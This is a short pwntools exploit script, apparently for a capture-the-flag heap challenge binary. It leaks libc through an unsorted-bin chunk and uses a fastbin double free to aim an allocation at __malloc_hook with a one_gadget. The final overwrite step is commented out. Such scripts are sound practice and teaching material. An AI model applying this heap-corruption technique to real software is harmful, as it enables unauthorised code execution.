#!/usr/bin/python3
from pwn import *

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug('./old_patched', gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process('./old_patched')

# Plan:

# Addresses
libc_offset = 0x3c4b78 # Calculated by leaking unsortedbins with no aslr and calculating distance to libc base
one_offset = 0xf1247
malloc_hook_offset = 0x3c4b10 # found using objdump -T <libc> | grep __malloc_hook

# Functions
m_index = 0

def malloc(size: int):
    global m_index
    io.sendline(b"1")
    io.sendlineafter(b"idx: ", f"{m_index}".encode())
    m_index += 1
    io.sendlineafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")

def free(index: int):
    io.sendline(b"2")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.recvuntil(b"> ")

def write(content: bytes, index: int):
    io.sendline(b"3")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.sendlineafter(b"contents: ", content)
    io.recvuntil(b"> ")

def view(index: int):
    io.sendline(b"4")
    io.sendlineafter(b"idx: ", str(index).encode())
    io.recvuntil(b"data: ")
    leak = io.recvuntil(b"[")
    io.recvuntil(b"> ")
    return leak

io = start()

# 1. leak libc
malloc(0x80) # idx 0
malloc(0x20) # idx 1
free(0)
libc_leak = view(0).rstrip(b"[")
libc_leak = u64(libc_leak.ljust(8, b"\x00"))
log.info("libc leak: %s" % hex(libc_leak))
libc_base = libc_leak - libc_offset
log.info("libc base: %s" % hex(libc_base))

one_gadget = libc_base + one_offset
malloc_hook = libc_base + malloc_hook_offset

# 2. fastbin dup
malloc(0x58) # Old chunk, idx 2
malloc(0x58) # A idx 3
malloc(0x58) # B idx 4

free(3) # A idx 3 : A linked into fastbin
free(4) # B idx 4 : B linked into fastbin
free(3) # A idx 3 : A linked into fastbin again

malloc(0x58) # Reallocate A, idx 5
write(p64(malloc_hook-35), 5) # Point to malloc_hooks-35 with fake size field
malloc(0x58) # Reallocate B, idx 6
malloc(0x58) # Reallocate A, idx 7 : Now we have malloc_hook-35 at head of fastbins

# 3. Overwrite malloc hook
#malloc(0x68) # Must be size 0x70 chunk, idx 8











io.interactive()
